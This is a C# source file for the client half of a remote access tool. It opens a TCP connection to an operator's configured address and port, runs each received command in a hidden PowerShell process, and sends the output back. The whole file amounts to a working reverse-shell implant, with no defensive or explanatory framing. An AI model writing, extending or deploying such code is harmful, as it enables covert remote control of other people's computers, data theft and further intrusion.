using System.Diagnostics;
using System.Net.Mime;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

namespace RemoteAccess.Client;

internal static class Client
{
    public static TcpClient Socket = null!;

    private const int BufferSize = 9000000;
    private static byte[] _buffer = null!;
    private static Packet _packet = null!;
    private static NetworkStream _networkStream = null!;

    public static void Connect()
    {
        Socket = new TcpClient
        {
            ReceiveBufferSize = BufferSize,
            SendBufferSize = BufferSize
        };

        _buffer = new byte[BufferSize];
        Socket.BeginConnect(Globals.IpAddress!, Globals.Port, ConnectCallback, Socket);
    }

    public static void Send(Packet packet)
    {
        try
        {
            _networkStream.BeginWrite(packet.Pack(), 0, packet.Count(), null, null);
        }
        catch (Exception e)
        {
            Console.WriteLine(e);
        }
    }

    private static Packet Pong()
    {
        var pong = new Packet(Packet.Type.Ping);

        return pong;
    }

    private static void Disconnect() => Socket.Close();

    private static void ConnectCallback(IAsyncResult result)
    {
        Socket.EndConnect(result);

        if (!Socket.Connected) return;

        _networkStream = Socket.GetStream();
        _packet = new Packet();
        _networkStream.BeginRead(_buffer, 0, BufferSize, ReceiveCallback, null);

        Send(Pong());
    }

    private static void ReceiveCallback(IAsyncResult result)
    {
        try
        {
            var bytesReadLength = _networkStream.EndRead(result);

            if (bytesReadLength <= 0)
            {
                Disconnect();
                return;
            }

            var bytesReadBuffer = new byte[bytesReadLength];
            Array.Copy(_buffer, bytesReadBuffer, bytesReadLength);

            Handle(bytesReadBuffer);

            _networkStream.BeginRead(_buffer, 0, BufferSize, ReceiveCallback, null);
        }
        catch
        {
            Disconnect();
        }
    }

    private static void Handle(byte[] buffer)
    {
        var type = _packet.Unpack(buffer, out var value, out var extension);

        switch (type)
        {
            case Packet.Type.None:
                var ps = new Process();

                ps.StartInfo.FileName = "powershell.exe";
                ps.StartInfo.RedirectStandardInput = true;
                ps.StartInfo.RedirectStandardOutput = true;
                ps.StartInfo.CreateNoWindow = true;
                ps.StartInfo.UseShellExecute = false;

                ps.Start();

                while (!ps.HasExited)
                {
                    ps.StandardInput.WriteLine(value);
                    ps.StandardInput.Flush();
                    ps.StandardInput.Close();

                    var packet = new Packet(Packet.Type.None, ps.StandardOutput.ReadToEnd());
                    Send(packet);
                }

                break;
            case Packet.Type.Ping:
                Console.WriteLine("Ping Received.");
                break;
            default:
                throw new Exception();
        }
    }
}